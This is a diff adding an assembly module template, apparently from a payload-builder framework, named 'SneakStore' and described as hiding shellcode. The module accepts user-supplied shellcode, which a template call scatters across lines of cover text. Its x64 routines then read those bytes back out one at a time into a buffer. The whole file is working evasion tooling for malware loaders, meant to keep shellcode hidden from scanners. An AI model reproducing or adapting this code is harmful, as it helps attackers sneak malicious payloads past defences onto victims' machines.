@@ -1,0 +1,189 @@
+#!name##SneakStore
+#!types##support
+#!subTypes##lib
+#!info##hide shellcode
+#!options##LIB_COMPILER##mingw-x64
+#!options##DLL_NO_DLL##True
+#!lang##asm
+#!system_FLAG##[W]
+#!reqFood##SNEAK_text##TEXT_data2##text database
+#!reqVar##SN_scode##The shellcode to use. You can insert a pre-made one from the 'food' section or paste your own. If you provide your own, it must be in the format: 0x11, 0xa3, etc.##str
+#!reqVar##SN_bytes_num##The number of shellcode bytes hidden in a single line of text.##int
+#!setVar##SN_bytes_num##2##int
+#!reqVar##SN_bytes_space##The base value for randomly choosing the distance between hidden bytes in each line of text.##int
+#!setVar##SN_bytes_space##5##int
+#!reqVar##SN_bytes_start##The character position in the text where shellcode hiding will begin.##int
+#!setVar##SN_bytes_start##5##int
+
+
+
+
+
+bits 64
+default rel
+
+
+global SneakReset   ; reset all index
+global SneakGetB   ; get one shellcode byte
+global SneakGetBs  ; get bytes
+
+section .data
+    
+    {{ TOOL.shellcode_text(SNEAK_text, SN_scode, "sv", sc_bytes_num=SN_bytes_num)}}
+
+
+
+section .bss
+    sni_master: resd 1    ; main index
+    sni_sc_index: resd 1    ; sneak index
+
+section .text
+
+SneakReset:
+; reset all counters
+    push rbp
+    mov rbp, rsp
+    push rcx
+    
+    ; reset main index
+    lea rcx, [sni_master]
+    mov dword [rcx], 0
+    ; reset sneak index
+    lea rcx, [sni_sc_index]
+    mov dword [rcx], 0
+    
+    pop rcx
+    pop rbp
+    ret
+    
+
+SneakGetBs:
+; extract shellcode bytes and put to buffer
+; IN: rcx - pointer to buffer
+; IN: rdx - number of bytes to take
+; OUT: rax - pointer to buffer
+    push rbp
+    mov rbp, rsp
+    sub rsp, 16
+    mov [rbp-8], rcx    ; pointer to buffer
+    push r15    
+    push r14
+    
+    mov r15, rdx
+    xor r14, r14    ; counter
+    
+    .load:
+        cmp r14, r15
+        je .return
+        sub rsp, 40
+        call SneakGetB
+        add rsp, 40
+        cmp al, 0   ; check if shellcode end
+        je .return
+        ; put byte to buffer
+        mov rcx, [rbp-8]
+        mov byte [rcx + r14], al
+        inc r14 ; counter + 1
+        jmp .load
+  
+    .return:
+        mov rax, [rbp-8]
+        pop r14
+        pop r15
+        add rsp, 16
+        pop rbp
+        ret
+        
+
+
+SneakGetB:
+; extract shellcode byte
+; OUT: rax - shellcode byte or 0
+    push rbp
+    mov rbp, rsp
+    push rcx
+    push rdx
+    
+    ; get main index
+    .get_main_index:
+        lea rcx, [sni_master]
+        mov ecx, [rcx]
+        lea rdx, [sv_all]
+        mov rdx, [rdx + 8 * rcx]    ;get actual text line
+        cmp rdx, 0  ; check if end
+        je .return_null
+    
+    ; extract
+    sub rsp, 40
+    mov rcx, rdx
+    call sneak_ext_line
+    add rsp, 40
+    cmp al, 0
+    je .increase_index    
+
+    .return:
+        pop rdx
+        pop rcx
+        pop rbp
+        ret
+
+    .return_null:
+        xor rax, rax    ; return 0
+        jmp .return
+    
+    .increase_index:
+        ; increase main index
+        lea rdx, [sni_master]
+        mov ecx, [rdx]
+        inc ecx
+        mov dword [rdx], ecx
+        ; reset sneak index
+        lea rdx, [sni_sc_index]
+        mov dword [rdx], 0
+        jmp .get_main_index
+
+
+
+sneak_ext_line:
+; extract shellcode byte
+; IN: rcx - pointer to text
+; OUT: rax - shellcode byte or 0
+    push rbp
+    mov rbp, rsp
+    push r8
+    push r9
+    
+    xor r8, r8
+    xor r9, r9
+
+    ; check in line index
+    lea r8, [sni_sc_index]
+    mov r8d, [r8]    ; get index of sneak_index
+    lea r9, [sv_index]
+    mov r9d, [r9 + 4*r8]   ; move sneak_index
+    cmp r9, 0   ; check if index is 0
+    je .return_null
+    
+    .begin:
+        ; get actual sneak_index
+        lea r8, [sni_sc_index]
+        mov r8d, [r8]    ; get index of sneak_index
+        lea r9, [sv_index]
+        mov r9d, [r9 + 4 * r8]
+        xor rax, rax
+        mov byte al, [rcx+r9]   ; return shellcode byte
+        ; update index
+        inc r8
+        lea r9, [sni_sc_index]
+        mov [r9], r8d
+    
+    .return:
+        pop r9
+        pop r8
+        pop rbp
+        ret
+
+    .return_null:
+        xor rax, rax    ; return 0
+        jmp .return
+
